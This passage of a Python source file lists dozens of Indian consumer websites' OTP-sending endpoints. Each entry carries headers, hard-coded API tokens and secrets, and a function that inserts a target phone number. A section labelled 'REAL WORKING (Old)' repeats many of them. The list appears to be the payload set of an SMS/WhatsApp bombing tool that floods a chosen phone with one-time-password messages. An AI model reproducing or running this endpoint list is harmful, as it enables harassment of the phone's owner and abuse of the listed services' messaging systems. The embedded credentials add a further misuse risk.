        "url": "https://in.bookmyshow.com/api/members/otp/send",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36",
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "x-app-code": "WEBV2",
            "x-region-slug": "mumbai",
            "x-platform-code": "WEBV2",
            "x-region-code": "MUMBAI",
            "origin": "https://in.bookmyshow.com",
            "referer": "https://in.bookmyshow.com/login/otp?referer=/my-profile&refresh=true&source=web"
        },
        "data": lambda p: f'{{"channel":"phone","subChannel":"sms","details":{{"phone":"{p}","origin":"https://in.bookmyshow.com","isdCountryCode":"IN","isdCode":"+91"}}}}'
    },
    {
        "name": "bewakoof_otp",
        "url": "https://api-prod.bewakoof.com/v3/user/auth/login/otp",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36",
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "api-token": "NGNlNTUwYTc0MjBjYzQzZTdiZTNhMmY1NjNhMThhOGU6OGI1NThkZDgtOGQ5ZS00OWYxLTk4MDAtNzYxMGEzOGNjYzNk",
            "x-client-device-token": "NGNlNTUwYTc0MjBjYzQzZTdiZTNhMmY1NjNhMThhOGU6OGI1NThkZDgtOGQ5ZS00OWYxLTk4MDAtNzYxMGEzOGNjYzNk",
            "x-origin-host": "api-prod.bewakoof.com/v3/user/auth/login/otp",
            "origin": "https://www.bewakoof.com",
            "referer": "https://www.bewakoof.com/"
        },
        "data": lambda p: f'{{"mobile":"{p}","country_code":"+91"}}'
    },
    {
        "name": "aakash_generate_otp",
        "url": "https://antheapi.aakash.ac.in/api/generate-lead-otp",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36",
            "Content-Type": "application/json",
            "x-client-id": "a6fbf1d2-27c3-46e1-b149-0380e506b763",
            "origin": "https://www.aakash.ac.in",
            "referer": "https://www.aakash.ac.in/"
        },
        "data": lambda p: f'{{"mobile_psid":"{p}","mobile_number":"","activity_type":"aakash-myadmission","webengageData":{{"profile":"student","whatsapp_opt_in":true,"method":"mobile"}}}}'
    },
    {
        "name": "lenskart_send_otp",
        "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "X-API-Client": "mobilesite",
            "X-Session-Token": "7836451c-4b02-4a00-bde1-15f7fb50312a",
            "Origin": "https://www.lenskart.com",
            "Referer": "https://www.lenskart.com/",
            "User-Agent": "Mozilla/5.0"
        },
        "data": lambda p: f'{{"captcha":null,"phoneCode":"+91","telephone":"{p}"}}'
    },
    {
        "name": "gopinkcabs_login",
        "url": "https://www.gopinkcabs.com/app/cab/customer/login_admin_code.php",
        "method": "POST",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "User-Agent": "Mozilla/5.0"
        },
        "data": lambda p: f"check_mobile_number=1&contact={p}"
    },
    {
        "name": "shemaroome_resend",
        "url": "https://www.shemaroome.com/users/resend_otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "User-Agent": "Mozilla/5.0"
        },
        "data": lambda p: f"mobile_no=%2B91{p}"
    },
    {
        "name": "kpnfresh_web",
        "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=WEB&version=1.0.0",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "x-channel-id": "WEB",
            "x-app-id": "d7547338-c70e-4130-82e3-1af74eda6797",
            "User-Agent": "Mozilla/5.0"
        },
        "data": lambda p: f'{{"phone_number":{{"number":"{p}","country_code":"+91"}}}}'
    },
    {
        "name": "kpnfresh_and",
        "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.2.6",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "x-app-id": "66ef3594-1e51-4e15-87c5-05fc8208a20f",
            "User-Agent": "okhttp/5.0.0-alpha.11"
        },
        "data": lambda p: f'{{"notification_channel":"WHATSAPP","phone_number":{{"country_code":"+91","number":"{p}"}}}}'
    },
    {
        "name": "bikefixup_otp",
        "url": "https://api.bikefixup.com/api/v2/send-registration-otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "client": "app",
            "User-Agent": "Dart/3.6"
        },
        "data": lambda p: f'{{"phone":"{p}","app_signature":"4pFtQJwcz6y"}}'
    },
    {
        "name": "rappi_wa",
        "url": "https://services.rappi.com/api/rappi-authentication/login/whatsapp/create",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "Deviceid": "5df83c463f0ff8ff"
        },
        "data": lambda p: f'{{"phone":"{p}","country_code":"+91"}}'
    },
    {
        "name": "stratzy_sms",
        "url": "https://stratzy.in/api/web/auth/sendPhoneOTP",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "Origin": "https://stratzy.in",
            "Referer": "https://stratzy.in/login"
        },
        "data": lambda p: f'{{"phoneNo":"{p}"}}'
    },
    {
        "name": "stratzy_wa",
        "url": "https://stratzy.in/api/web/whatsapp/sendOTP",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "Origin": "https://stratzy.in"
        },
        "data": lambda p: f'{{"phoneNo":"{p}"}}'
    },
    {
        "name": "wellacademy_login",
        "url": "https://wellacademy.in/store/api/numberLoginV2",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "Origin": "https://wellacademy.in"
        },
        "data": lambda p: f'{{"contact_no":"{p}"}}'
    },
    {
        "name": "hungama_otp",
        "url": "https://communication.api.hungama.com/v1/communication/otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "Origin": "https://www.hungama.com",
            "identifier": "home",
            "country_code": "IN"
        },
        "data": lambda p: f'{{"mobileNo":"{p}","countryCode":"+91","appCode":"un","messageId":"1","templateCode":1}}'
    },
    {
        "name": "servetel_otp",
        "url": "https://api.servetel.in/v1/auth/otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Dalvik/2.1.0"
        },
        "data": lambda p: f"mobile_number={p}"
    },
    {
        "name": "merucab_otp",
        "url": "https://merucabapp.com/api/otp/generate",
        "method": "POST",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded",
            "Mid": "287187234baee1714faa43f25bdf851b3eff3fa9fbdc90d1d249bd03898e3fd9",
            "User-Agent": "okhttp/4.9.0"
        },
        "data": lambda p: f"mobile_number={p}"
    },
    {
        "name": "beepkart_otp",
        "url": "https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "Origin": "https://www.beepkart.com"
        },
        "data": lambda p: f'{{"city":362,"fullName":"","phone":"{p}","source":"myaccount","consent":false}}'
    },
    {
        "name": "lendingplate_api",
        "url": "https://lendingplate.com/api.php",
        "method": "POST",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Origin": "https://lendingplate.com"
        },
        "data": lambda p: f"mobiles={p}&resend=Resend&clickcount=3"
    },
    {
        "name": "snitch_otp",
        "url": "https://mxemjhp3rt.ap-south-1.awsapprunner.com/auth/otps/v2",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "client-id": "snitch_secret",
            "Origin": "https://www.snitch.com"
        },
        "data": lambda p: f'{{"mobile_number":"+91{p}"}}'
    },
    {
        "name": "dayco_otp",
        "url": "https://ekyc.daycoindia.com/api/nscript_functions.php",
        "method": "POST",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://ekyc.daycoindia.com"
        },
        "data": lambda p: f"api=send_otp&brand=dayco&mob={p}&resend_otp=resend_otp"
    },
    {
        "name": "penpencil_resend",
        "url": "https://api.penpencil.co/v1/users/resend-otp?smsType=1",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "User-Agent": "okhttp/3.9.1"
        },
        "data": lambda p: f'{{"organizationId":"5eb393ee95fab7468a79d189","mobile":"{p}"}}'
    },
    {
        "name": "imaginestore_otp",
        "url": "https://www.myimaginestore.com/mobilelogin/index/registrationotpsend/",
        "method": "POST",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://www.myimaginestore.com"
        },
        "data": lambda p: f"mobile={p}"
    },
    {
        "name": "nobroker_otp",
        "url": "https://www.nobroker.in/api/v3/account/otp/send",
        "method": "POST",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://www.nobroker.in"
        },
        "data": lambda p: f"phone={p}&countryCode=IN"
    },
    {
        "name": "cossouq_otp",
        "url": "https://www.cossouq.com/mobilelogin/otp/send",
        "method": "POST",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://www.cossouq.com"
        },
        "data": lambda p: f"mobilenumber={p}&otptype=register&resendotp=0&email=&oldmobile=0"
    },
    {
        "name": "shiprocket_otp",
        "url": "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "authorization": "Bearer null",
            "Origin": "https://app.shiprocket.in"
        },
        "data": lambda p: f'{{"mobileNumber":"{p}"}}'
    },
    {
        "name": "jockey_sms",
        "url": lambda p: f"https://www.jockey.in/apps/jotp/api/login/send-otp/+91{p}?whatsapp=false",
        "method": "GET",
        "headers": {
            "User-Agent": "Mozilla/5.0",
            "Referer": "https://www.jockey.in/"
        },
        "data": None
    },
    {
        "name": "jockey_wa",
        "url": lambda p: f"https://www.jockey.in/apps/jotp/api/login/resend-otp/+91{p}?whatsapp=true",
        "method": "GET",
        "headers": {
            "User-Agent": "Mozilla/5.0",
            "Referer": "https://www.jockey.in/"
        },
        "data": None
    },
    {
        "name": "newme_otp",
        "url": "https://prodapi.newme.asia/web/otp/request",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "Caller": "web_app",
            "Origin": "https://newme.asia"
        },
        "data": lambda p: f'{{"mobile_number":"{p}","resend_otp_request":true}}'
    },
    {
        "name": "univest_otp",
        "url": lambda p: f"https://api.univest.in/api/auth/send-otp?type=web4&countryCode=91&contactNumber={p}",
        "method": "GET",
        "headers": {
            "User-Agent": "okhttp/3.9.1"
        },
        "data": None
    },
    {
        "name": "rappi_mx",
        "url": "https://services.mxgrability.rappi.com/api/rappi-authentication/login/whatsapp/create",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "User-Agent": "okhttp/3.9.1"
        },
        "data": lambda p: f'{{"country_code":"+91","phone":"{p}"}}'
    },
    {
        "name": "foxy_otp",
        "url": "https://www.foxy.in/api/v2/users/send_otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "X-Guest-Token": "01943c60-aea9-7ddc-b105-e05fbcf832be",
            "Origin": "https://www.foxy.in"
        },
        "data": lambda p: f'{{"guest_token":"01943c60-aea9-7ddc-b105-e05fbcf832be","user":{{"phone_number":"+91{p}"}},"device":null,"invite_code":""}}'
    },
    {
        "name": "foxy_wa",
        "url": "https://www.foxy.in/api/v2/users/send_otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "X-Guest-Token": "01943c60-aea9-7ddc-b105-e05fbcf832be",
            "Origin": "https://www.foxy.in"
        },
        "data": lambda p: f'{{"user":{{"phone_number":"+91{p}"}},"via":"whatsapp"}}'
    },
    {
        "name": "eka_care_init",
        "url": "https://auth.eka.care/auth/init",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "User-Agent": "okhttp/4.9.3",
            "Device-Id": "5df83c463f0ff8ff"
        },
        "data": lambda p: f'{{"payload":{{"allowWhatsapp":true,"mobile":"+91{p}"}},"type":"mobile"}}'
    },
    {
        "name": "smytten_new_device",
        "url": "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "Origin": "https://smytten.com"
        },
        "data": lambda p: f'{{"ad_id":"","device_info":{{}},"device_id":"","device_platform":"web","phone":"{p}","email":"test@test.com"}}'
    },
    {
        "name": "wakefit_sms",
        "url": "https://api.wakefit.co/api/consumer-sms-otp/",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "Origin": "https://www.wakefit.co",
            "API-Secret-Key": "ycq55IbIjkLb",
            "API-Token": "c84d563b77441d784dce71323f69eb42"
        },
        "data": lambda p: f'{{"mobile":"{p}","whatsapp_opt_in":1}}'
    },
    {
        "name": "caratlane_otp",
        "url": "https://www.caratlane.com/cg/dhevudu",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "Origin": "https://www.caratlane.com",
            "Authorization": "b945ebaf43ed7541d49cfd60bd82b81908edff8d465caecfe58deef209"
        },
        "data": lambda p: f'{{"query":"mutation {{SendOtp(input: {{mobile: \\"{p}\\", isdCode: \\"91\\", otpType: \\"registerOtp\\"}}) {{status {{message code}}}}}}"}}'
    },

    {
        "name": "zestmoney",
        "url": "https://authentication.zestmoney.in/v2/mobile/otp/",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 Chrome/144.0.0.0 Mobile Safari/537.36",
            "Content-Type": "application/json",
            "token": "135b043150475d7288b936606e086af5c1fb7f0eff15256748f5ad078ebdcf85",
            "Origin": "https://app.zestmoney.in",
            "Referer": "https://app.zestmoney.in/"
        },
        "data": lambda p: f'{{"MobileNumber":"91{p}","MessageParams":{{"MerchantKey":"null"}}}}'
    },
    {
        "name": "bewakoof",
        "url": "https://api-prod.bewakoof.com/v3/user/auth/login/otp",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 Chrome/144.0.0.0 Mobile Safari/537.36",
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "api-token": "NGNlNTUwYTc0MjBjYzQzZTdiZTNhMmY1NjNhMThhOGU6OGI1NThkZDgtOGQ5ZS00OWYxLTk4MDAtNzYxMGEzOGNjYzNk",
            "x-client-device-token": "NGNlNTUwYTc0MjBjYzQzZTdiZTNhMmY1NjNhMThhOGU6OGI1NThkZDgtOGQ5ZS00OWYxLTk4MDAtNzYxMGEzOGNjYzNk",
            "x-origin-host": "api-prod.bewakoof.com/v3/user/auth/login/otp",
            "Origin": "https://www.bewakoof.com",
            "Referer": "https://www.bewakoof.com/"
        },
        "data": lambda p: f'{{"mobile":"{p}","country_code":"+91"}}'
    },
    {
        "name": "eurekaforbes",
        "url": "https://www.eurekaforbes.com/api/public/ecom/v1/otp/send",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/91.0 Mobile Safari/537.36",
            "Content-Type": "application/json"
        },
        "data": lambda p: f'{{"mobile_number":"{p}"}}'
    },
    {
        "name": "bookmyshow",
        "url": "https://in.bookmyshow.com/api/members/otp/send",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 Chrome/144.0.0.0 Mobile Safari/537.36",
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "x-app-code": "WEBV2",
            "x-geohash": "te7",
            "x-region-slug": "mumbai",
            "x-latitude": "19.12175",
            "x-longitude": "72.8504",
            "x-platform-code": "WEBV2",
            "x-region-code": "MUMBAI",
            "Origin": "https://in.bookmyshow.com",
            "Referer": "https://in.bookmyshow.com/login/otp?referer=/my-profile&refresh=true&source=web"
        },
        "data": lambda p: f'{{"channel":"phone","subChannel":"sms","details":{{"phone":"{p}","origin":"https://in.bookmyshow.com","isdCountryCode":"IN","isdCode":"+91"}}}}'
    },
    {
        "name": "pharmeasy_apt",
        "url": "https://pharmeasy.in/apt-api/login/send-otp",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 Chrome/144.0.0.0 Mobile Safari/537.36",
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "Origin": "https://pharmeasy.in",
            "Referer": "https://pharmeasy.in/"
        },
        "data": lambda p: f'{{"param":"{p}"}}'
    },
    {
        "name": "dailyhunt",
        "url": "https://dailyhunt.in/api/pwa",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 Chrome/144.0.0.0 Mobile Safari/537.36",
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Origin": "https://dailyhunt.in",
            "Referer": "https://dailyhunt.in/news/india/english/login/mobile-verification?mode=pwa&onlyLogin=true"
        },
        "data": lambda p: f'{{"method":"POST","body":{{"mobileNo":"91-{p}"}},"url":"http://dh-ugc-users.dailyhunt.in//api/v1/internal/pwa/accounts/generate/otp"}}'
    },
    {
        "name": "cordelia",
        "url": "https://api-pro.cordeliacruises.com/auth/b2c/generate-otp",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 Chrome/144.0.0.0 Mobile Safari/537.36",
            "Content-Type": "application/json",
            "Origin": "https://www.cordeliacruises.com",
            "Referer": "https://www.cordeliacruises.com/"
        },
        "data": lambda p: f'{{"phoneNumber":"{p}","countryCode":"+91","website":"https://www.cordeliacruises.com/login","pageCode":"login"}}'
    },
    {
        "name": "urbanladder",
        "url": "https://www.urbanladder.com/api/service/application/user/authentication/v1.0/login/otp",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 Chrome/144.0.0.0 Mobile Safari/537.36",
            "Content-Type": "application/json",
            "authorization": "Bearer NjVmNDM3ZmFlNzg4NTEwMjg3MDdkYWVlOmI0ZEZvd2ZRSw==",
            "Origin": "https://www.urbanladder.com",
            "Referer": "https://www.urbanladder.com/auth/login"
        },
        "data": lambda p: f'{{"mobile":"{p}","country_code":"91","captcha_code":"grimlock_eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0IjoxNzY5NDQwNTQyNjAyfQ.4sY-nJ89czQEY0MYp2hT1sRH0ADY9c1LE-AuC-hIHbY"}}'
    },
    {
        "name": "mamaearth_gokwik",
        "url": "https://gkx.gokwik.co/kp/api/v1/auth/otp/send",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 Chrome/144.0.0.0 Mobile Safari/537.36",
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJ1c2VyLWtleSIsImlhdCI6MTc2OTUyNjQ3MSwiZXhwIjoxNzY5NTI2NTMxfQ.HLM1KyRImw0paDZMBYkFdm-6E1pQco_GitAdrUqrgy8",
            "gk-request-id": "51c1169f-3c41-4b75-ac29-47e1e3b9d25d",
            "kp-request-id": "ad5d18a8-824f-4a47-a5cf-6f732151c2dc",
            "gk-merchant-id": "12wyqc26spoknx0kv7t",
            "Origin": "https://mamaearth.in",
            "Referer": "https://mamaearth.in/"
        },
        "data": lambda p: f'{{"phone":"{p}","country":"in","country_code":"+91"}}'
    },
    {
        "name": "allen",
        "url": "https://api.allen-live.in/api/v1/auth/sendOtp?center_id&source=home-page-login",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 Chrome/144.0.0.0 Mobile Safari/537.36",
            "Content-Type": "application/json",
            "x-device-id": "29eeb510-774d-47e6-9606-19142305f562",
            "x-client-type": "mweb",
            "Origin": "https://allen.in",
            "Referer": "https://allen.in/"
        },
        "data": lambda p: f'{{"country_code":"91","phone_number":"{p}","persona_type":"STUDENT","otp_type":"SHARED_DEFAULT"}}'
    },
    {
        "name": "snapdeal",
        "url": "https://m.snapdeal.com/signupCompleteAjax",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 Chrome/144.0.0.0 Mobile Safari/537.36",
            "Content-Type": "application/json;charset=UTF-8",
            "Origin": "https://m.snapdeal.com",
            "Referer": "https://m.snapdeal.com/signin"
        },
        "data": lambda p: f'{{"j_password":null,"j_mobilenumber":"{p}","agree":true,"j_confpassword":null,"journey":"mobile","numberEdit":false,"j_fullname":"Guest","swp":true}}'
    },
    {
        "name": "fabindia",
        "url": "https://apisap.fabindia.com/occ/v2/fabindiab2c/otp/generate?lang=en&curr=INR",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 Chrome/144.0.0.0 Mobile Safari/537.36",
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "authorization": "bearer yYo1wwUV1B1yUqYeo4YrbKF5WNI",
            "Origin": "https://www.fabindia.com",
            "Referer": "https://www.fabindia.com/"
        },
        "data": lambda p: f'{{"mobileDailCode":"+91","mobileNumber":"{p}","isLogin":false,"isSignUp":false}}'
    },
    {
        "name": "shoppersstop",
        "url": "https://api-sscom-preprod.ssecom.tech/v2/olg/sendOTP",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 Chrome/144.0.0.0 Mobile Safari/537.36",
            "Content-Type": "application/json",
            "Origin": "https://www.shoppersstop.com",
            "Referer": "https://www.shoppersstop.com/"
        },
        "data": lambda p: f'{{"mobile":"{p}","type":"SIGNIN_WITH_MOBILE"}}'
    },
    {
        "name": "olx",
        "url": "https://www.olx.in/api/auth/authenticate?lang=en-IN",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 Chrome/144.0.0.0 Mobile Safari/537.36",
            "Content-Type": "application/json",
            "x-panamera-client-id": "web-mobile",
            "Origin": "https://www.olx.in",
            "Referer": "https://www.olx.in/en-in"
        },
        "data": lambda p: f'{{"grantType":"phone","phone":"+91{p}","language":"en-IN"}}'
    },
    {
        "name": "zepto_v2",
        "url": "https://bff-gateway.zepto.com/api/v1/user/customer/send-otp-sms/",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 Chrome/144.0.0.0 Mobile Safari/537.36",
            "Accept": "application/json",
            "Content-Type": "application/json; charset=UTF-8",
            "x-csrf-secret": "uD0aoNYI_ZA",
            "platform": "WEB",
            "Origin": "https://www.zepto.com",
            "Referer": "https://www.zepto.com/"
        },
        "data": lambda p: f'{{"mobileNumber":"{p}"}}'
    },
    {
        "name": "aakash",
        "url": "https://antheapi.aakash.ac.in/api/generate-lead-otp",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 Chrome/144.0.0.0 Mobile Safari/537.36",
            "Content-Type": "application/json",
            "x-client-id": "a6fbf1d2-27c3-46e1-b149-0380e506b763",
            "Origin": "https://www.aakash.ac.in",
            "Referer": "https://www.aakash.ac.in/"
        },
        "data": lambda p: f'{{"mobile_psid":"{p}","mobile_number":"","activity_type":"aakash-myadmission","webengageData":{{"profile":"student","whatsapp_opt_in":true,"method":"mobile"}}}}'
    },

    # ══════════════ REAL WORKING (Old) ══════════════
    {"name": "lenskart", "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp", "method": "POST", "headers": {"Content-Type": "application/json", "X-API-Client": "mobilesite", "X-Session-Token": "7836451c-4b02-4a00-bde1-15f7fb50312a", "Origin": "https://www.lenskart.com", "Referer": "https://www.lenskart.com/", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f'{{"captcha":null,"phoneCode":"+91","telephone":"{p}"}}'},
    {"name": "gopinkcabs", "url": "https://www.gopinkcabs.com/app/cab/customer/login_admin_code.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f"check_mobile_number=1&contact={p}"},
    {"name": "shemaroome", "url": "https://www.shemaroome.com/users/resend_otp", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f"mobile_no=%2B91{p}"},
    {"name": "kpnfresh_web", "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=WEB&version=1.0.0", "method": "POST", "headers": {"Content-Type": "application/json", "x-channel-id": "WEB", "x-app-id": "d7547338-c70e-4130-82e3-1af74eda6797", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f'{{"phone_number":{{"number":"{p}","country_code":"+91"}}}}'},
    {"name": "kpnfresh_and", "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.2.6", "method": "POST", "headers": {"Content-Type": "application/json", "x-app-id": "66ef3594-1e51-4e15-87c5-05fc8208a20f", "User-Agent": "okhttp/5.0.0-alpha.11"}, "data": lambda p: f'{{"notification_channel":"WHATSAPP","phone_number":{{"country_code":"+91","number":"{p}"}}}}'},
    {"name": "bikefixup", "url": "https://api.bikefixup.com/api/v2/send-registration-otp", "method": "POST", "headers": {"Content-Type": "application/json", "client": "app", "User-Agent": "Dart/3.6"}, "data": lambda p: f'{{"phone":"{p}","app_signature":"4pFtQJwcz6y"}}'},
    {"name": "rappi_wa", "url": "https://services.rappi.com/api/rappi-authentication/login/whatsapp/create", "method": "POST", "headers": {"Content-Type": "application/json", "Deviceid": "5df83c463f0ff8ff"}, "data": lambda p: f'{{"phone":"{p}","country_code":"+91"}}'},
    {"name": "stratzy_sms", "url": "https://stratzy.in/api/web/auth/sendPhoneOTP", "method": "POST", "headers": {"Content-Type": "application/json", "Origin": "https://stratzy.in", "Referer": "https://stratzy.in/login"}, "data": lambda p: f'{{"phoneNo":"{p}"}}'},
    {"name": "stratzy_wa", "url": "https://stratzy.in/api/web/whatsapp/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json", "Origin": "https://stratzy.in"}, "data": lambda p: f'{{"phoneNo":"{p}"}}'},
    {"name": "wellacademy", "url": "https://wellacademy.in/store/api/numberLoginV2", "method": "POST", "headers": {"Content-Type": "application/json", "Origin": "https://wellacademy.in"}, "data": lambda p: f'{{"contact_no":"{p}"}}'},
    {"name": "hungama", "url": "https://communication.api.hungama.com/v1/communication/otp", "method": "POST", "headers": {"Content-Type": "application/json", "Origin": "https://www.hungama.com", "identifier": "home", "country_code": "IN"}, "data": lambda p: f'{{"mobileNo":"{p}","countryCode":"+91","appCode":"un","messageId":"1","templateCode":1}}'},
    {"name": "servetel", "url": "https://api.servetel.in/v1/auth/otp", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Dalvik/2.1.0"}, "data": lambda p: f"mobile_number={p}"},
    {"name": "merucab", "url": "https://merucabapp.com/api/otp/generate", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded", "Mid": "287187234baee1714faa43f25bdf851b3eff3fa9fbdc90d1d249bd03898e3fd9", "User-Agent": "okhttp/4.9.0"}, "data": lambda p: f"mobile_number={p}"},
    {"name": "beepkart", "url": "https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp", "method": "POST", "headers": {"Content-Type": "application/json", "Origin": "https://www.beepkart.com"}, "data": lambda p: f'{{"city":362,"fullName":"","phone":"{p}","source":"myaccount","consent":false}}'},
    {"name": "lendingplate", "url": "https://lendingplate.com/api.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Origin": "https://lendingplate.com"}, "data": lambda p: f"mobiles={p}&resend=Resend&clickcount=3"},
    {"name": "snitch", "url": "https://mxemjhp3rt.ap-south-1.awsapprunner.com/auth/otps/v2", "method": "POST", "headers": {"Content-Type": "application/json", "client-id": "snitch_secret", "Origin": "https://www.snitch.com"}, "data": lambda p: f'{{"mobile_number":"+91{p}"}}'},
    {"name": "dayco", "url": "https://ekyc.daycoindia.com/api/nscript_functions.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded", "Origin": "https://ekyc.daycoindia.com"}, "data": lambda p: f"api=send_otp&brand=dayco&mob={p}&resend_otp=resend_otp"},
    {"name": "penpencil", "url": "https://api.penpencil.co/v1/users/resend-otp?smsType=1", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "okhttp/3.9.1"}, "data": lambda p: f'{{"organizationId":"5eb393ee95fab7468a79d189","mobile":"{p}"}}'},
    {"name": "imaginestore", "url": "https://www.myimaginestore.com/mobilelogin/index/registrationotpsend/", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded", "Origin": "https://www.myimaginestore.com"}, "data": lambda p: f"mobile={p}"},
    {"name": "nobroker", "url": "https://www.nobroker.in/api/v3/account/otp/send", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded", "Origin": "https://www.nobroker.in"}, "data": lambda p: f"phone={p}&countryCode=IN"},
    {"name": "cossouq", "url": "https://www.cossouq.com/mobilelogin/otp/send", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded", "Origin": "https://www.cossouq.com"}, "data": lambda p: f"mobilenumber={p}&otptype=register&resendotp=0&email=&oldmobile=0"},
    {"name": "shiprocket", "url": "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send", "method": "POST", "headers": {"Content-Type": "application/json", "authorization": "Bearer null", "Origin": "https://app.shiprocket.in"}, "data": lambda p: f'{{"mobileNumber":"{p}"}}'},
